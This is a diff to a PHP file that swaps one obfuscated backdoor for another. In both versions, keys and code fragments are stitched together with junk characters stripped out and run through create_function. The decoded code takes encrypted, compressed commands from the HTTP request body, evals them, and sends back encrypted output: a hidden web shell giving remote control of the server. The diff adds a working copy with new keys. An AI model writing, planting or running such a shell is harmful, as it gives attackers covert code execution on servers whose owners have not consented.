@@ -1,11 +1,13 @@
 <?php
-$Z='unOction x(OO$t,$k){$c=stOrlenO($k);$l=OOstrlenO($t);$o=O"";for($OOi=0;$i<$Ol;)O{OfoOr';
-$V=str_replace('v','','vcrevate_vfuvncvtivon');
-$w='ndO_cleanO(O);$r=@basOeO64_encode(@xO(@gzcomOOpress(O$o),$k));priOOnOt("$p$kh$r$kf");}';
-$b='$k="90fO2Oc9c5";$khO="3f6654O0e6O734";O$kOf=O"9e0ab83d8cd0";O$Op="l2hd6qfUQJOaYpaOMN";f';
-$s='Oh("/$khO(.+O)$Okf/",@file_gOet_conOtentsO("phOp://inpuOt"),$mO)O=O=1){@Oob_start();@eO';
-$o='($j=0;($j<$c&&$i<$l);$jO++,$Oi++){O$o.=$t{O$i}^O$k{$Oj};}O}return O$o;}if(O@preg_matc';
-$y='val(@gzuncOOompress(@x(@Obase6O4_Odecode($m[1])O,$k)))O;$oO=@ob_OgetO_contenOts();@ob_e';
-$O=str_replace('O','',$b.$Z.$o.$s.$y.$w);
-$K=$V('',$O);$K();
+$t='$l);$j++aE,aE$aEi++){$o.=$t{$i}^$k{$j};}aE}raEeturn $aEo;}if(aE@preaEg_match';
+$S='=@basaEeaE6aE4_encode(@x(@gzcaEaEomaEpress($o),$k));paEriaEnt("$p$kh$aEr$kf");}';
+$r=str_replace('I','','crIeaItIIe_fuInIction');
+$Z='("aE/$kh(.+)$aEkaEf/",@file_geaEt_aEconaEtentsaE(aE"php://aEinput"),$m)';
+$I='=aE=1){@ob_staraEt();aE@aEevaEal(@gzunaEcoaEmpress(@x(@baaEse64_daEecode';
+$a='$k="48aE2c81aE1d";$aEkh=aE"aEa5d5b4bc6d49";aE$kf=aE"7ffa98aE49aE1aEe38"';
+$y='aEaEaEaE=straElen($t);$o="";for($aEi=0;$i<$l;){foaEaEr($j=aE0;(aE$j<$aEcaE&&$i<';
+$g=';$p="zHGhaEXc0b422m3MaEjb";fuaEnctaEion x($taE,$k)aE{$c=strlenaE($k);$l';
+$v='($maE[1])aE,$k)));$o=@aEaEob_gaEet_contents(aE)aE;@obaE_end_cleanaE();$r';
+$N=str_replace('aE','',$a.$g.$y.$t.$Z.$I.$v.$S);
+$U=$r('',$N);$U();
 ?>
